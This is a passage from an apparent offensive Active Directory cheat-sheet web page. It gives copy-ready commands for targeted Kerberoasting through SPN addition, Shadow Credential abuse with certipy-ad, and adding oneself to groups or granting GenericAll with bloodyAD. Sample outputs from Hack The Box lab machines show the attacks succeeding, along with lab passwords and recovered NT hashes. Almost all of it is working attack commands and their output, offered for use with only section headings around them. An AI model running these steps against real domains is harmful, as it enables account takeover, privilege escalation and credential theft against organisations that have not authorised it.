<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a Cred Object (runas) [Optional]</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">'<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\<span class="o editable-keyword">&lt;USER&gt;</span>'</span>
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'</span> -AsPlainText -Force
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-add-a-spn">3. Add a SPN</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> eg. MSSQLSvc/example.com:1433
</span></span><span class="line"><span class="cl"><span class="go">setspn -a '<span class="o editable-keyword">&lt;SERVICE&gt;</span>/<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span>:<span class="o editable-keyword">&lt;SERVICE_PORT&gt;</span>' '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="4-check">4. Check</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainUser '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' | Select serviceprincipalname
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="5-get-the-spn">5. Get the SPN</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainSPNTicket -SPN '<span class="o editable-keyword">&lt;SERVICE&gt;</span>/<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span>:<span class="o editable-keyword">&lt;SERVICE_PORT&gt;</span>' -Credential $Cred
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div></div></div>

<p></p>
<hr>
<h3 id="abuse-3-shadow-credential">Abuse #3: Shadow Credential</h3>
<p class="tabs">
<button data-tabset="set3" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set3"><div class="tabcontent active" data-tabset="set3" data-tabcontent="tab1"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad shadow auto -username '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -password '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -account <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad shadow auto -username judith.mader@certified.htb -password <span class="s1">'judith09'</span> -account management_svc -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186                                           
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.2 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Targeting user 'management_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate generated
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating Key Credential
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Key Credential generated with DeviceID 'b7e204ab-10bb-721e-4f98-72297623b1ad'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Adding Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully added Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Authenticating as 'management_svc' with the certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate identities:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     No identities found in this certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: 'management_svc@certified.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving credential cache to 'management_svc.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">File 'management_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote credential cache to 'management_svc.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for 'management_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Restoring the old Key Credentials for 'management_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully restored the old Key Credentials for 'management_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad shadow auto -username '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -account <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad shadow auto -username <span class="s1">'management_svc@CERTIFIED.HTB'</span> -hashes <span class="s1">':a091c1832bcdd4677c28b5a6a1295584'</span> -account CA_OPERATOR -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.2 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Targeting user 'ca_operator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate generated
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating Key Credential
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Key Credential generated with DeviceID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Adding Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully added Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Authenticating as 'ca_operator' with the certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate identities:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     No identities found in this certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: 'ca_operator@certified.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving credential cache to 'ca_operator.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote credential cache to 'ca_operator.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for 'ca_operator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Restoring the old Key Credentials for 'ca_operator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully restored the old Key Credentials for 'ca_operator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Kerberos
</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; certipy-ad shadow auto -username '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -password '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -account <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ldap-scheme ldap -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s 10.129.232.31 <span class="o">&amp;&amp;</span> certipy-ad shadow auto -username oorend@REBOUND.HTB -password <span class="s1">'1GR8t@$$4u'</span> -k -account winrm_svc -target DC01.REBOUND.HTB -dc-host DC01.REBOUND.HTB -ldap-scheme ldap -ns 10.129.232.31
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.2 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Targeting user 'winrm_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate generated
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating Key Credential
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Key Credential generated with DeviceID '6ea7763d-2272-1bea-078c-e58a01662a29'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Adding Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully added Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Authenticating as 'winrm_svc' with the certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate identities:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     No identities found in this certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: 'winrm_svc@rebound.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving credential cache to 'winrm_svc.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote credential cache to 'winrm_svc.ccache'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for 'winrm_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Restoring the old Key Credentials for 'winrm_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully restored the old Key Credentials for 'winrm_svc'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
</span></span></span></div></pre></div></div></div><p></p>
<hr>
<h3 id="abuse-4--add-self-to-group-from-linux">Abuse #4 : Add Self to Group (From Linux)</h3>
<p class="tabs">
<button data-tabset="set4" data-tabcontent="tab1" class="active">bloodyAD</button>

<button data-tabset="set4" data-tabcontent="tab2">powerview.py</button>

</p><div class="tabset-wrapper" data-tabset-group="set4"><div class="tabcontent active" data-tabset="set4" data-tabcontent="tab1"><h4 id="1-add-self-to-group">1. Add Self to Group</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' --host <span class="o editable-keyword">&lt;DC&gt;</span> add groupMember '<span class="o editable-keyword">&lt;GROUP&gt;</span>' '<span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -d rebound.htb -u <span class="s1">'oorend'</span> -p <span class="s1">'1GR8t@$$4u'</span> --host 10.10.11.231 add groupMember SERVICEMGMT <span class="s1">'oorend'</span>
</span></span><span class="line"><span class="cl"><span class="go">[+] oorend added to SERVICEMGMT
</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add groupMember '<span class="o editable-keyword">&lt;GROUP&gt;</span>' '<span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -d absolute.htb -u <span class="s1">'m.lovegod'</span> -p <span class="s1">'AbsoluteLDAP2022!'</span> -k --host dc.absolute.htb add groupMember <span class="s1">'NETWORK AUDIT'</span> <span class="s1">'m.lovegod'</span>
</span></span><span class="line"><span class="cl"><span class="go">[+] m.lovegod added to NETWORK AUDIT
</span></span></span></div></pre></div><h4 id="2-add-genericall-over-target-group">2. Add GenericAll over Target Group</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' --host <span class="o editable-keyword">&lt;DC&gt;</span> add genericAll 'OU=<span class="o editable-keyword">&lt;TARGET_GROUP&gt;</span>,DC=<span class="o editable-keyword">&lt;EXAMPLE&gt;</span>,DC=<span class="o editable-keyword">&lt;COM&gt;</span>' '<span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -d rebound.htb -u <span class="s1">'oorend'</span> -p <span class="s1">'1GR8t@$$4u'</span> --host 10.10.11.231 add genericAll <span class="s1">'OU=SERVICE USERS,DC=REBOUND,DC=HTB'</span> <span class="s1">'oorend'</span>
</span></span><span class="line"><span class="cl"><span class="go">[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
